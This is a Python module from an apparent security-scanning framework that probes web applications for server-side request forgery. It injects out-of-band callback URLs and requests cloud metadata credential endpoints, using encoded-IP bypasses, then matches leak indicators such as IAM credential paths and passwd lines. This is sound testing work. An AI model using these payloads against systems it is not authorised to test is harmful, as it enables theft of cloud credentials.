"""OOB SSRF detection probe (Module 1)."""
from __future__ import annotations

import secrets
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse, quote

import httpx

from audit.decorators import audit_logged
from sdk.base import BaseModule, Finding, Phase, Severity, VulnType
from sdk.decorators import roe_gated
from ._oob.server import OOBCallbackServer

CLOUD_TARGETS = {
    "aws": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "gcp": "http://metadata.google.internal/computeMetadata/v1/",
    "azure": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "localhost": "http://127.0.0.1/",
}

_CLOUD_INDICATORS = [
    "ami-id", "instance-id", "iam/security-credentials",
    "computeMetadata", "azure_instance", "root:x:", "/bin/bash",
]


def _bypass_encodings(url: str) -> list[str]:
    variants = [url]
    if "169.254.169.254" in url:
        variants += [
            f"http://{quote('169.254.169.254')}/",
            "http://2852039166/",
            "http://0xa9.0xfe.0xa9.0xfe/",
        ]
    if "127.0.0.1" in url:
        variants += ["http://[::1]/", "http://localhost/"]
    return list(dict.fromkeys(variants))


class OOBSSRFProbe(BaseModule):
    name = "oob_ssrf"
    phase = Phase.ACTIVE
    vuln_types = [VulnType.OOB_SSRF, VulnType.SSRF]
    author = "swift-core"
    version = "1.0"

    @roe_gated("oob_ssrf")
    @audit_logged("probe_executed")
    async def probe(self, target, session, roe) -> list[Finding]:
        url = str(target)
        findings: list[Finding] = []

        async with OOBCallbackServer() as cbs:
            injection_points = self._detect_injection_points(url)
            for ip in injection_points:
                token = secrets.token_hex(8)
                cb_url = cbs.alloc_url(token)

                await self._inject_http(ip, cb_url)
                evt = await cbs.wait_for_callback(token, timeout=8.0)
                if evt:
                    findings.append(Finding(
                        module=self.name,
                        vuln_type=VulnType.OOB_SSRF,
                        severity=Severity.CRITICAL,
                        title=f"OOB SSRF confirmed at param '{ip['param']}'",
                        description=(
                            f"Out-of-band HTTP callback received from {evt.source_ip}. "
                            "Server fetched our callback URL."
                        ),
                        target_url=ip["url"],
                        confidence=1.0,
                        oob_confirmed=True,
                        cwe_id=918,
                        chain_primitive="ssrf",
                        request_evidence=cb_url,
                        response_evidence=str(evt.data),
                        raw_metadata={"callback": {
                            "source_ip": evt.source_ip,
                            "protocol": evt.protocol,
                            "data": evt.data,
                        }},
                    ))
                    continue

                # Reflected cloud metadata check (lower confidence)
                for cloud, md_url in CLOUD_TARGETS.items():
                    for variant in _bypass_encodings(md_url):
                        reflected, body = await self._try_reflected(ip, variant)
                        if reflected:
                            findings.append(Finding(
                                module=self.name,
                                vuln_type=VulnType.SSRF,
                                severity=Severity.HIGH,
                                title=f"Reflected SSRF → {cloud} metadata",
                                description=body[:500],
                                target_url=ip["url"],
                                confidence=0.6,
                                cwe_id=918,
                                raw_metadata={"cloud_provider": cloud, "bypass": variant},
                            ))

        return findings

    def _detect_injection_points(self, base_url: str) -> list[dict]:
        parsed = urlparse(base_url)
        params = list(parse_qs(parsed.query).keys())
        if not params:
            params = ["url"]
        return [{"url": base_url, "param": p, "method": "GET"} for p in params]

    async def _inject_http(self, ip: dict, cb_url: str) -> None:
        parsed = urlparse(ip["url"])
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[ip["param"]] = [cb_url]
        new_url = urlunparse(parsed._replace(query=urlencode(params, doseq=True)))
        try:
            async with httpx.AsyncClient(timeout=5, verify=False,
                                         follow_redirects=False) as client:
                await client.get(new_url)
        except Exception:
            pass

    async def _try_reflected(self, ip: dict, test_url: str) -> tuple[bool, str]:
        parsed = urlparse(ip["url"])
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[ip["param"]] = [test_url]
        new_url = urlunparse(parsed._replace(query=urlencode(params, doseq=True)))
        try:
            async with httpx.AsyncClient(timeout=5, verify=False,
                                         follow_redirects=True) as client:
                resp = await client.get(new_url)
                body = resp.text
                if any(ind in body for ind in _CLOUD_INDICATORS):
                    return True, body
        except Exception:
            pass
        return False, ""
